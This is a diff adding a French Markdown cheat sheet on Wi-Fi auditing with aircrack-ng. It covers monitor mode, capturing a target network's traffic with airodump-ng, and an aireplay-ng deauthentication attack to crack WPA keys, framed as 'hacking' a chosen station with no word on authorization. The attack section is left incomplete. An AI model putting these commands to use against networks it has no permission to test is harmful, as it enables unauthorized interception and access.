@@ -1,0 +1,46 @@
+# Réseau Linux
+## Écoute des réseaux
+### Installation
+Il est recommandé d’utiliser la distribution Kali Linux pour toutes les utilisation ciblées réseau. L'objectif de Kali Linux est de fournir une distribution regroupant l'ensemble des outils nécessaires aux tests de sécurité d'un système d'information, notamment le test d'intrusion.
+Site Officiel : https://www.kali.org/
+Page Wikipédia : https://fr.wikipedia.org/wiki/Kali_Linux 
+
+$ sudo apt-get install aircrack-ng		#Installer Aircrack-ng, un outils de sécurité Wi-Fi permettant de casser les clés WEP et WPA-PSK à partir de paquets capturés sur le réseau
+### Démarche à suivre
+	$ airmon-ng					#Obtenir les informations de configuration des différentes interfaces réseau sans fil
+	$ airmon-zc start <interface>			#Placer une interface réseau sans fil en mode moniteur
+	$ airodump-ng <paramètres> <interface moniteur>		#Écouter les réseaux pour obtenir les informations nécessaires (attendre quelques temps pour qu’ils apparaissent)
+Informations utiles :
+* BSSID
+* CH : Numéro de channel
+* RXQ : Qualité radio du signal, bon au dessus de 50
+
+Ctrl + C : Quitter airodump-ng
+
+	$ airodump-ng -w out --encrypt <encryptage> -c <numéro de chanel> --bssid <BSSID> <interface> #Cibler la station que l’on veut hacker pour n’avoir plus qu’elle, le fichier de capture s’appelle out-01.cap
+
+Exemple :
+
+	$ airodump-ng -w out --encrypt wpa -c 5 --bssid F4:CA:E5:AF:E0:20 mon0
+
+/ ! \ Pour cracker un WPA, il est NÉCESSAIRE qu’au moins une station (client) soit connecté au réseau ciblé
+### airplay-ng : l'attaque active
+Ouvrir deux nouveaux terminaux
+- Dans le 1er :
+`$ aireplay-ng -0 0 -a <BSSID> -c <station> <Interface>`
+- Dans le 2nd :
+### Vérifier l'état de son réseau
+```bash
+$ ip neighbour						#
+
+$ ping <adresse_IP/url>				#
+	-c <nombre> : Définir le nombre de requêtes à envoyer (infini si non défini)
+
+$ ifconfig							#Lister les différentes interfaces réseau sans fil
+$ ifconfig <interface> up			#Activer l’interface réseau
+$ iwlist <interface> scan			#Lister les réseaux Wifi présents aux alentours
+$ iwconfig <interface> essid <ESSID> key <mot de passe>	#Se connecter au réseau souhaité
+$ dhclient <interface>				#Demander une nouvelle adresse IP
+```
+### Documentation
+https://fr.wikihow.com/d%C3%A9chiffrer-un-cryptage-WEP
